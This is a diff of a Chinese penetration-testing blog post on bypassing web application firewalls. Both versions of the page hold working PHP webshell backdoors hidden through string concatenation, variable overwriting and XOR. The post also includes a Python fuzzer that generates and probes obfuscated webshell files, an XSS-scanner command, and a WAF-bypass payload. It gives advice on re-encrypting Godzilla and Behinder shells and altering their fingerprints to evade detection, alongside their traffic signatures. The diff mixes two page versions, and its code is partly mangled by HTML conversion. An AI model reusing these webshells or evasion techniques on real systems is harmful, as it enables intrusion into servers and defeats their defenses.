-<p><strong>print</strong> (‘check-&gt;’+filename+’-&gt;no’)</p>
-</li>
-<li>
-<p>time.sleep(1)</p>
-</li>
-<li></li>
-<li></li>
-<li>
-<p><strong>def</strong> shell_test_check():</p>
-</li>
-<li>
-<p>url=‘<span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4MDgxL3gvMzN4ZDY0LnBocA==">http://127.0.0.1:8081/x/33xd64.php</span>’</p>
-</li>
-<li>
-<p>datas={</p>
-</li>
-<li>
-<p>‘x’:‘phpinfo();’</p>
-</li>
-<li>
-<p>}</p>
-</li>
-<li>
-<p>result=requests.post(url,data=datas).content.decode(‘utf-8’)</p>
-</li>
-<li>
-<p><strong>print</strong> (result)</p>
-</li>
-<li>
-<p><strong>if</strong> ‘XIAODI-PC’ <strong>in</strong> result:</p>
-</li>
-<li>
-<p><strong>print</strong> (‘ok’)</p>
-</li>
-<li></li>
-<li>
-<p><strong>if</strong> <strong>name</strong> == ‘<strong>main</strong>’:</p>
-</li>
-<li>
-<p>q=queue.Queue()</p>
-</li>
-<li>
-<p><strong>for</strong> i <strong>in</strong> range(1, 127):</p>
-</li>
-<li>
-<p><strong>for</strong> ii <strong>in</strong> range(1, 127):</p>
-</li>
-<li>
-<p>payload = “’”&quot;’&quot; + chr(i) + “’” + ‘^’ + “’”&quot;’&quot; + chr(ii) + “’”</p>
-</li>
-<li>
-<p>code = “<?php $a=(" + payload + ").'ssert';$a($_POST[x]);?>”</p>
-</li>
-<li>
-<p>filename = str(i) + ‘xd’ + str(ii) + ‘.php’</p>
-</li>
-<li>
-<p>q.put(filename)</p>
-</li>
-<li>
-<p>with open(‘D:/phpstudy/PHPTutorial/WWW/x/’ + filename, ‘a’) as f:</p>
-</li>
-<li>
-<p>f.write(code)</p>
-</li>
-<li>
-<p>f.close()</p>
-</li>
-<li>
-<p><strong>print</strong> (‘Fuzz 文件生成成功’)</p>
-</li>
-<li>
-<p><strong>for</strong> x <strong>in</strong> range(20):</p>
-</li>
-<li>
-<p>t=threading.Thread(target=string)</p>
-</li>
-<li>
-<p>t.start()<br>
- 可以通过在线的接口将自己的木马再次加密，如果此加密未加入到官方的<br>
-指纹系统，则还是可以绕过 waf 的。如将哥斯拉自动生成的马再次进行加密。<br>
-加密后上传 webshell，仍旧可以连接成功，则可以绕。</p>
-</li>
-</ol>
-<h3 id="74-冰蝎哥斯拉流量分析"><a class="markdownIt-Anchor" href="#74-冰蝎哥斯拉流量分析">#</a> 7.4 冰蝎哥斯拉流量分析</h3>
-<h4 id="741-waf绕过的思路"><a class="markdownIt-Anchor" href="#741-waf绕过的思路">#</a> 7.4.1 waf 绕过的思路</h4>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">可能通过正则匹配、机器学习、行为分析等方式来绕过 waf。实战中多半</span><br><span class="line">是先进的安全公司的设备，必须进行魔改各种连接工具才可以绕过 waf，需要</span><br><span class="line">就具体情况进行判断。</span><br><span class="line">webshell利用工具的流量也可以通过proxifer设置代理转发至burp观察，实</span><br><span class="line">际上，proxifer的作用就是拦截一些不能设置代理的软件，将其流量代理到自己</span><br><span class="line">设置的目标端口上，目标端口可以是快代理，burp，fiddler 等可以监听端口的</span><br><span class="line">工具。</span><br><span class="line">或者不借助proxifer而是用wireshark来捕获网卡中的所有流量，通过过滤</span><br><span class="line">数据包来确定当前所使用工具的流量，跟随流量流，分析流量特征。</span><br><span class="line">如果一堆加密字符中出现了大量的&quot;/&quot;以及不规则的大小写字母及数字组成，</span><br><span class="line">则可以判断出此加密可能属于 AES；如果有大量的等号而无&quot;/&quot;则可以猜测属于</span><br><span class="line">base 64 。</span><br></pre></td></tr></table></figure>
-<h4 id="742-冰蟹原理"><a class="markdownIt-Anchor" href="#742-冰蟹原理">#</a> 7.4.2 冰蟹原理</h4>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">自己手动输入一个密钥，并采用md 5 加密生成 32 位字符取前 16 位作为key</span><br><span class="line">值，服务端接收客户端发送的key存储session返回客户端，客户端先将代码进</span><br><span class="line">行base 64 编码，再继续发送基于key与偏移量 0123456789 abcdef及采用CBC模</span><br><span class="line">式的AES加密操作的数据包，此后服务器解密数据包进行遍历自身文件或其他</span><br><span class="line">操作，并把结果再次进行一层base 64 编码及AES加密，客户端接受服务端发送</span><br></pre></td></tr></table></figure>
-<h5 id="的数据包解密后并在工具上做展示"><a class="markdownIt-Anchor" href="#的数据包解密后并在工具上做展示">#</a> 的数据包解密后并在工具上做展示。</h5>
-<h4 id="743-冰蟹数据包特征"><a class="markdownIt-Anchor" href="#743-冰蟹数据包特征">#</a> 7.4.3 冰蟹数据包特征</h4>
-<p>0 、User-agent：代码中定义<br>
- 1 、Pragma: no-cache<br>
-2 、Content-Type：application/x-www-form-urlencoded<br>
-3 、Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<br>
-image/webp,image/ap ng,<em>/</em>;q=0.8,application/signed-exchange;v=b3;q=0.9<br>
-4 、Accept-Encoding: gzip, deflate, br<br>
-5 、Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</p>
-<p>每次冰蟹操作数据时都会发送出这几个数据，这几个数据单独来看是没有<br>
-什么特征的，但是如果合在一起使用就可以确定很大概率是冰蟹在操作，可以<br>
-认为是恶意指令。<br>
-通过 wireshark 抓取冰蟹操作时的流量，分析流量特征进行捕获从而确定出<br>
-指纹；且其采用 jar 文件生成，可以反编译查找其中的指纹来源进行修订再次重<br>
-新编译成 jar 包，并修订原有指纹绕过 waf，生成一个自己专属的 webshell 连接<br>
-工具。<br>
-反编译 jar 文件用 jd-jui 打开之后，如果代码中含有 php 代码是看不了的，<br>
-还是需要将其导入到 IDEA 中才可以看到全部的代码。</p>
-<h4 id="744-哥斯拉特征"><a class="markdownIt-Anchor" href="#744-哥斯拉特征">#</a> 7.4.4 哥斯拉特征</h4>
-<p>1 、User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0)<br>
-Gecko/20100101 Firefox/84.0<br>
-2 、Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<br>
-<em>/</em>;q=0.8<br>
-3 、Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,<br>
-en;q=0.2<br>
-4 、Cookie: PHPSESSID=rut2a51prso470jvfe2q502o44; cookie 最后面存在一<br>
-个 &quot;;&quot;</p>
+<p>使用方法：<br>
+ <code>python xsstrike.py -u &quot;http://xx/xss__get.php?message=1&amp; submit=submit&quot; --proxy</code></p>
+<h4 id="其他绕过"><a class="markdownIt-Anchor" href="#其他绕过">#</a> 其他绕过</h4>
+<p>采用参数替换绕过:txt=<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mo>=</mo><mi>s</mi><mi>t</mi><msub><mi>r</mi><mi>r</mi></msub><mi>e</mi><mi>p</mi><mi>l</mi><mi>a</mi><mi>c</mi><mi>e</mi><msup><mo stretchy="false">(</mo><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><msup><mi>x</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><msup><mo separator="true">,</mo><mrow><mo mathvariant="normal">′</mo><mo mathvariant="normal">′</mo></mrow></msup><msup><mo separator="true">,</mo><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi>p</mi><mi>x</mi><mi>h</mi><mi>p</mi><mi>x</mi><mi>i</mi><mi>n</mi><mi>x</mi><mi>f</mi><mi>o</mi><mo stretchy="false">(</mo><msup><mo stretchy="false">)</mo><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo><mo separator="true">;</mo><mi>a</mi><mi>s</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>t</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">y=str_replace(&#x27;x&#x27;,&#x27;&#x27;,&#x27;pxhpxinxfo()&#x27;);assert(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">e</span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal">c</span><span class="mord mathnormal">e</span><span class="mopen"><span class="mopen">(</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct"><span class="mpunct">,</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct"><span class="mpunct">,</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">x</span><span class="mord mathnormal">h</span><span class="mord mathnormal">p</span><span class="mord mathnormal">x</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">o</span><span class="mopen">(</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">t</span><span class="mopen">(</span></span></span></span>y);&amp;submit=%E6%8F%90%E4%BA%A4</p>
+<p>文件包含使用…\ …/ …\ 等</p>
+<h3 id="权限控制对抗"><a class="markdownIt-Anchor" href="#权限控制对抗">#</a> 权限控制对抗</h3>
+<h4 id="php-传参带入"><a class="markdownIt-Anchor" href="#php-传参带入">#</a> php 传参带入</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">php木马如下</span></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">a=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">aa=<span class="variable">$a</span>.<span class="string">&#x27;ert&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">aa(base64_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]));</span></span><br><span class="line">?&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">代码利用</span></span><br><span class="line">?a=ass</span><br><span class="line">x=cGhwaW5mbygpOw==</span><br></pre></td></tr></table></figure>
+<h4 id="php-变量覆盖"><a class="markdownIt-Anchor" href="#php-变量覆盖">#</a> php 变量覆盖</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">php木马如下</span></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">a=<span class="string">&#x27;b&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">b=<span class="string">&#x27;assert&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="variable">$a</span>(base64_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]));</span></span><br><span class="line">?&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">代码利用</span></span><br><span class="line">x=cGhwaW5mbygpOw==</span><br></pre></td></tr></table></figure>
+<h4 id="php-加密变异"><a class="markdownIt-Anchor" href="#php-加密变异">#</a> php 加密变异</h4>
+<p><span class="exturl" data-url="aHR0cDovL3d3dy5waHBqbS5uZXQv">http://www.phpjm.net/</span><br>
+<span class="exturl" data-url="aHR0cHM6Ly93d3cucGhwam1zLmNvbS8=">https://www.phpjms.com/</span><br>
+<span class="exturl" data-url="aHR0cDovLzE1NzY6MTIzNC8=">http://1576:1234/</span></p>
+<h4 id="php-异或运算"><a class="markdownIt-Anchor" href="#php-异或运算">#</a> php 异或运算</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">异或</span></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import threading,queue</span><br><span class="line"></span><br><span class="line">def string():</span><br><span class="line">  while not q.empty():</span><br><span class="line">    filename=q.get()</span><br><span class="line">    url = &#x27;http://10.0.1:8081/x/&#x27; + filename</span><br><span class="line">    datas = &#123;</span><br><span class="line">      &#x27;x&#x27;: &#x27;phpinfo();&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    result = requests.post(url, data=datas).content.decode(&#x27;utf-8&#x27;)</span><br><span class="line">    if &#x27;XIAODI-PC&#x27; in result:</span><br><span class="line">      print (&#x27;check-&gt;&#x27;+filename+&#x27;-&gt;ok&#x27;)</span><br><span class="line">    else:</span><br><span class="line">      print (&#x27;check-&gt;&#x27;+filename+&#x27;-&gt;no&#x27;)</span><br><span class="line">    time.sleep(1)</span><br><span class="line"></span><br><span class="line">def shell_test_check():</span><br><span class="line">  url=&#x27;http://0.1:8081/x/33xd6php&#x27;</span><br><span class="line">  datas=&#123;</span><br><span class="line">    &#x27;x&#x27;:&#x27;phpinfo();&#x27;</span><br><span class="line">  &#125;</span><br><span class="line">  result=requests.post(url,data=datas).content.decode(&#x27;utf-8&#x27;)</span><br><span class="line">  print (result)</span><br><span class="line">  if &#x27;XIAODI-PC&#x27; in result:</span><br><span class="line">    print (&#x27;ok&#x27;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">q=queue.Queue()</span><br><span class="line">  for i in range(1, 127):</span><br><span class="line">    for ii in range(1, 127):</span><br><span class="line">      payload = &quot;&#x27;&quot;&quot;&#x27;&quot; + chr(i) + &quot;&#x27;&quot; + &#x27;^&#x27; + &quot;&#x27;&quot;&quot;&#x27;&quot; + chr(ii) + &quot;&#x27;&quot;</span><br><span class="line">      code = &quot;&lt;?php $a=(&quot; + payload + &quot;).&#x27;ssert&#x27;;$a($_POST[x]);?&gt;&quot;</span><br><span class="line">      filename = str(i) + &#x27;xd&#x27; + str(ii) + &#x27;.php&#x27;</span><br><span class="line">      q.put(filename)</span><br><span class="line">      with open(&#x27;D:/phpstudy/PHPTutorial/WWW/x/&#x27; + filename, &#x27;a&#x27;) as f:</span><br><span class="line">        f.write(code)</span><br><span class="line">        f.close()</span><br><span class="line">        print(&#x27;Fuzz文件生成成功&#x27;)</span><br><span class="line">  for x in range(20):</span><br><span class="line">    t=threading.Thread(target=string)</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure>
+<p><strong>可以通过在线的接口将自己的木马再次加密，如果此加密未加入到官方的指纹系统，则还是可以绕过 waf 的。如将哥斯拉自动生成的马再次进行加密。加密后上传 webshell，仍旧可以连接成功，则可以绕。</strong></p>
+<h3 id="冰蝎哥斯拉流量分析"><a class="markdownIt-Anchor" href="#冰蝎哥斯拉流量分析">#</a> 冰蝎哥斯拉流量分析</h3>
+<h4 id="waf绕过思路"><a class="markdownIt-Anchor" href="#waf绕过思路">#</a> waf 绕过思路</h4>
+<p>可能通过正则匹配、机器学习、行为分析等方式来绕过 waf。实战中多半是先进的安全公司的设备，必须进行魔改各种连接工具才可以绕过 waf，需要 就具体情况进行判断。</p>
+<p>webshell 利用工具的流量也可以通过 proxifer 设置代理转发至 burp 观察，实际上，proxifer 的作用就是拦截一些不能设置代理的软件，将其流量代理到自己 设置的目标端口上，目标端口可以是快代理，burp，fiddler 等可以监听端口的工具。</p>
+<p>或者不借助 proxifer 而是用 wireshark 来捕获网卡中的所有流量，通过过滤数据包来确定当前所使用工具的流量，跟随流量流，分析流量特征。</p>
+<p>如果一堆加密字符中出现了大量的 &quot;/“以及不规则的大小写字母及数字组成， 则可以判断出此加密可能属于 AES; 如果有大量的等号而无”/&quot; 则可以猜测属于 base64。</p>
+<h4 id="冰蟹原理"><a class="markdownIt-Anchor" href="#冰蟹原理">#</a> 冰蟹原理</h4>
+<p>自己手动输入一个密钥，并采用 md5 加密生成 32 位字符取前 16 位作为 key 值，服务端接收客户端发送的 key 存储 session 返回客户端，客户端先将代码进 行 base64 编码，再继续发送基于 key 与偏移量 0123456789abcdef 及采用 CBC 模式的 AES 加密操作的数据包，此后服务器解密数据包进行遍历自身文件或其他 操作，并把结果再次进行一层 base64 编码及 AES 加密，客户端接受服务端发送的数据包解密后并在工具上做展示。</p>
+<h4 id="冰蟹数据包特征"><a class="markdownIt-Anchor" href="#冰蟹数据包特征">#</a> 冰蟹数据包特征</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">User-agent：代码中定义</span><br><span class="line"></span><br><span class="line">Pragma: no-cache</span><br><span class="line"></span><br><span class="line">Content-Type：application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/ap ng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br></pre></td></tr></table></figure>
+<p>每次冰蟹操作数据时都会发送出这几个数据，这几个数据单独来看是没有 什么特征的，但是如果合在一起使用就可以确定很大概率是冰蟹在操作，可以 认为是恶意指令。</p>
+<p>通过 wireshark 抓取冰蟹操作时的流量，分析流量特征进行捕获从而确定出 指纹；且其采用 jar 文件生成，可以反编译查找其中的指纹来源进行修订再次重 新编译成 jar 包，并修订原有指纹绕过 waf，生成一个自己专属的 webshell 连接 工具。</p>
+<p>反编译 jar 文件用 jd-jui 打开之后，如果代码中含有 php 代码是看不了的，还是需要将其导入到 IDEA 中才可以看到全部的代码。</p>
+<h4 id="哥斯拉数据包特征"><a class="markdownIt-Anchor" href="#哥斯拉数据包特征">#</a> 哥斯拉数据包特征</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla/0 (Windows NT 0; Win64; x64; rv:80) Gecko/20100101 Firefox/80</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"></span><br><span class="line">Cookie: PHPSESSID=rut2a51prso470jvfe2q502o44; cookie 最后面存在一个&quot;;&quot;</span><br></pre></td></tr></table></figure>
 
+      <div class="tags">
+          <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"><i class="ic i-tag"></i> 渗透测试</a>
+      </div>
   </div>
 
    <footer>
@@ -514,9 +293,9 @@ en;q=0.2<br>
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">更新于</span>
-    <time title="修改时间：2023-07-04 01:49:47" itemprop="dateModified" datetime="2023-07-04T01:49:47+08:00">2023-07-04</time>
+    <time title="修改时间：2023-07-04 18:59:20" itemprop="dateModified" datetime="2023-07-04T18:59:20+08:00">2023-07-04</time>
   </span>
-  <span id="2023/07/04/SAFE/7 waf攻防/" class="item leancloud_visitors" data-flag-title="" title="阅读次数">
+  <span id="2023/07/04/SAFE/7 waf攻防/" class="item leancloud_visitors" data-flag-title="XD22 7 Waf 攻防" title="阅读次数">
       <span class="icon">
         <i class="ic i-eye"></i>
       </span>
@@ -558,7 +337,7 @@ en;q=0.2<br>
   </li>
   <li class="link">
     <strong>本文链接：</strong>
-    <a href="http://n1h1l157.github.io/2023/07/04/SAFE/7%20waf%E6%94%BB%E9%98%B2/" title="">http://n1h1l157.github.io/2023/07/04/SAFE/7 waf攻防/</a>
+    <a href="http://n1h1l157.github.io/2023/07/04/SAFE/7%20waf%E6%94%BB%E9%98%B2/" title="XD22 7 Waf 攻防">http://n1h1l157.github.io/2023/07/04/SAFE/7 waf攻防/</a>
   </li>
   <li class="license">
     <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
@@ -577,20 +356,20 @@ en;q=0.2<br>
     <div class="item left">
       
 
-  <a href="/2023/07/04/SAFE/6%20%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%8F%8A%E5%88%A9%E7%94%A8/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;vGCLbdJPMhuwg3H.jpg" title="未命名">
+  <a href="/2023/07/04/SAFE/8%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;OqCyTJE92HvirRI.jpg" title="XD22 8 代码审计">
   <span class="type">上一篇</span>
-  <span class="category"><i class="ic i-flag"></i> </span>
-  <h3>未命名</h3>
+  <span class="category"><i class="ic i-flag"></i> 信息安全</span>
+  <h3>XD22 8 代码审计</h3>
   </a>
 
     </div>
     <div class="item right">
       
 
-  <a href="/2023/07/04/SAFE/8%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;DmrBVlwMeUxpa4K.jpg" title="未命名">
+  <a href="/2023/07/04/SAFE/6%20%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%8F%8A%E5%88%A9%E7%94%A8/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;RxL7bMZt5rslE68.jpg" title="XD22 6 漏洞发现及利用">
   <span class="type">下一篇</span>
-  <span class="category"><i class="ic i-flag"></i> </span>
-  <h3>未命名</h3>
+  <span class="category"><i class="ic i-flag"></i> 信息安全</span>
+  <h3>XD22 6 漏洞发现及利用</h3>
   </a>
 
     </div>
@@ -609,9 +388,12 @@ en;q=0.2<br>
   <div class="panels">
     <div class="inner">
       <div class="contents panel pjax" data-title="文章目录">
-          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#71-waf%E6%8B%A6%E6%88%AA%E4%B8%8B%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text"> 7.1 waf 拦截下的信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#711-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text"> 7.1.1 信息收集基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B8%B8%E8%A7%81%E6%A3%80%E6%B5%8B"><span class="toc-number">1.1.1.</span> <span class="toc-text"> （ 1 ）信息收集常见检测：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E6%88%96%E5%B7%A5%E5%85%B7%E9%80%9F%E5%BA%A6%E6%B5%81%E9%87%8F%E5%BF%AB"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 脚本或工具速度流量快</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E6%88%96%E5%B7%A5%E5%85%B7%E7%9A%84%E6%8C%87%E7%BA%B9%E8%A2%AB%E8%AF%86%E5%88%AB"><span class="toc-number">1.1.3.</span> <span class="toc-text"> 脚本或工具的指纹被识别</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#722-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E8%84%9A%E6%9C%AC"><span class="toc-number">1.2.</span> <span class="toc-text"> 7.2.2 信息收集脚本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#72-waf%E6%8B%A6%E6%88%AA%E4%B8%8B%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text"> 7.2 waf 拦截下的漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#721-sql%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E7%BB%95%E8%BF%87"><span class="toc-number">2.1.</span> <span class="toc-text"> 7.2.1 sql 注入利用绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 